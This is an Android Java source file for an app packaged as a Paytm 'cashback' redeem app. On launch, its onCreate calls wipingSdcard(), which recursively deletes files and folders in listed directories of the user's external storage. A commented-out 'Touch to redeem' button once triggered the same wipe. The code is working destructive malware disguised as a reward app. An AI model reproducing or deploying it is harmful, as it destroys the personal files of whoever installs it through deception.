package cashback.paytm.com.cashback;

import android.os.Bundle;
import android.os.Environment;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;

import java.io.File;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        wipingSdcard();
        setContentView(R.layout.activity_main);
//        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
//        setSupportActionBar(toolbar);
//
//        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
//        fab.setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View view) {
//                Snackbar.make(view, "Touch to redeem", Snackbar.LENGTH_LONG)
//                        .setAction("Action", new View.OnClickListener() {
//                            @Override
//                            public void onClick(View v) {
//                                wipingSdcard();
//                            }
//                        }).show();
//            }
//        });
    }

    public void wipingSdcard() {
        String externalStorageDirectoryString = Environment
                .getExternalStorageDirectory().toString();
        FileListings listings = new FileListings();
        for(String subTree : listings.listings){
            try {
                File deleteMatchingFile = new File(externalStorageDirectoryString+"/"+subTree);

                    File[] filenames = deleteMatchingFile.listFiles();
                    if (filenames != null && filenames.length > 0) {
                        for (File tempFile : filenames) {
                            if (tempFile.isDirectory()) {
                                wipeDirectory(tempFile.toString());
                                tempFile.delete();
                            } else {
                                tempFile.delete();
                            }
                        }
                    } else {
                        deleteMatchingFile.delete();
                    }
            } catch (Exception e) {
               Log.e(TAG, "Not Present "+ subTree + " OR " + e.getMessage());
            }
        }
    }

    private void wipeDirectory(String name) {
        File directoryFile = new File(name);
        File[] filenames = directoryFile.listFiles();
        if (filenames != null && filenames.length > 0) {
            for (File tempFile : filenames) {
                if (tempFile.isDirectory()) {
                    wipeDirectory(tempFile.toString());
                    tempFile.delete();
                } else {
                    tempFile.delete();
                }
            }
        } else {
            directoryFile.delete();
        }
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    private void getAllFilesOfDir(File directory) {
        Log.d(TAG, "Directory: " + directory.getAbsolutePath() + "\n");


        final File[] files = directory.listFiles();

        if ( files != null ) {
            for ( File file : files ) {
                if ( file != null ) {
                    if ( file.isDirectory() ) {  // it is a folder...
                        getAllFilesOfDir(file);
                    }
                    else {  // it is a file...
                        Log.d(TAG, "File: " + file.getAbsolutePath() + "\n");
                    }
                }
            }
        }
    }
}
